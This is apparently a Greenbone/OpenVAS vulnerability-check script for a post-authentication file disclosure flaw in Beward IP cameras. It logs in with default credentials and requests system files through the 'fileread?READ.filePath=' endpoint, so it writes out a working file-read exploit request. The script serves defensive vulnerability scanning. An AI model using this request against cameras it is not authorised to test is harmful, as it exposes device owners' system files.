if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.114073" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:C/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2019-02-18 14:02:55 +0100 (Mon, 18 Feb 2019)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_name( "Beward IP Cameras Arbitrary File Disclosure Vulnerability" );
	script_dependencies( "gb_beward_ip_camera_consolidation.sc", "gb_beward_ip_cameras_default_credentials.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "beward/ip_camera/detected", "beward/ip_camera/credentials", "Host/runs_unixoide" );
	script_xref( name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php" );
	script_tag( name: "summary", value: "The remote installation of Beward's IP camera software is prone to
  a post-authentication arbitrary file disclosure vulnerability." );
	script_tag( name: "impact", value: "This issue may be exploited by a remote attacker to
  read any system file." );
	script_tag( name: "insight", value: "Input passed via the 'READ.filePath' parameter in fileread script is not properly
  verified before being used to read files. This can be exploited to disclose the contents of arbitrary files via
  absolute path or via the SendCGICMD API." );
	script_tag( name: "vuldetect", value: "Checks if the host responds with a simple requested file." );
	script_tag( name: "affected", value: "At least versions M2.1.6.04C014 and before." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
CPE = "cpe:/h:beward";
if(!info = get_app_port_from_cpe_prefix( cpe: CPE, service: "www" )){
	exit( 0 );
}
CPE = info["cpe"];
port = info["port"];
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
creds = get_kb_list( "beward/ip_camera/credentials" );
if(!creds){
	exit( 0 );
}
files = traversal_files( "linux" );
for cred in creds {
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/cgi-bin/operator/fileread?READ.filePath=/" + file;
		req = http_get_req( port: port, url: url, add_headers: make_array( "Accept-Encoding", "gzip, deflate", "Authorization", "Basic " + base64( str: cred ) ) );
		res = http_keepalive_send_recv( port: port, data: req );
		if(egrep( string: res, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			report += "\nUsed default credentials for the login and the sent request: (username:password)\n" + cred;
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

